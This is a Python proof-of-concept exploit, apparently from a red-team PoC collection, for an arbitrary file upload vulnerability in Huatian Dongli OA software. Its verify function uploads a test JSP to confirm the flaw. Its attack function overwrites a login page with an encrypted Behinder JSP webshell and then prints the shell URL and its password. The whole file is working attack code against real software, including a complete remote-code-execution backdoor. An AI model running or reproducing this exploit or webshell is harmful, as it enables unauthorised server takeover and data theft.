import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '华天动力 OA 任意文件上传漏洞(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'url': url,
        'about': 'https://github.com/Phuong39/2022-HW-POC/blob/main/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B%20OA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/OAapp/jsp/upload.jsp'
    payload2 = '/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
    }
    vurl = urllib.parse.urljoin(url, payload)
    vurl2 = urllib.parse.urljoin(url, payload2)
    data = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    data2 = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"\r\nContent-Type: image/png\r\n\r\n{0}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="newFileName"\r\n\r\n{1}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    verify_url = urllib.parse.urljoin(url, '/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp')
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('.+\.dat', rep.text):
            path = re.findall('(.*?)Tomcat/webapps/.*?\.dat', rep.text)
            if len(path) != 0:
                path = path[0]
            else:
                path = re.findall('(.*?)htoadata/appdata/.*?\.dat', rep.text)[0]
            data2 = data2.format(shell, path)
            rep2 = requests.post(vurl2, headers=headers, timeout=timeout, data=data2, verify=False)
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult


def attack(url):
    # 冰蝎
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    payload = '/OAapp/jsp/upload.jsp'
    payload2 = '/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp'
    timeout = 20
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
    }
    vurl = urllib.parse.urljoin(url, payload)
    vurl2 = urllib.parse.urljoin(url, payload2)
    data = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    data2 = '------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="EDITFILE"; filename="xxx.txt"\r\nContent-Type: image/png\r\n\r\n{0}\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm\r\nContent-Disposition: form-data; name="newFileName"\r\n\r\n{1}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r\n------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
    verify_url = urllib.parse.urljoin(url, '/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp')
    print('[+] exploit loading ......')
    time.sleep(2)
    try:
        print('[+] 开始尝试上传webshell')
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('.+\.dat', rep.text):
            path = re.findall('(.*?)Tomcat/webapps/.*?\.dat', rep.text)
            if len(path) != 0:
                path = path[0]
            else:
                path = re.findall('(.*?)htoadata/appdata/.*?\.dat', rep.text)[0]
            print('[+] 成功获取路径 path:', path)
            data2 = data2.format(shell, path)
            rep2 = requests.post(vurl2, headers=headers, timeout=timeout, data=data2, verify=False)
            print('[+] 上传完毕，正在检测是否成功?')
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},verify=False)
            if verify_rep.status_code == 200:
                print('[*] webshell上传成功! status: 200')
                print('[*] webshell(冰蝎): ', verify_url)
                print('[+] 密码: rebeyond')
                return True
        return False
    except:
        return False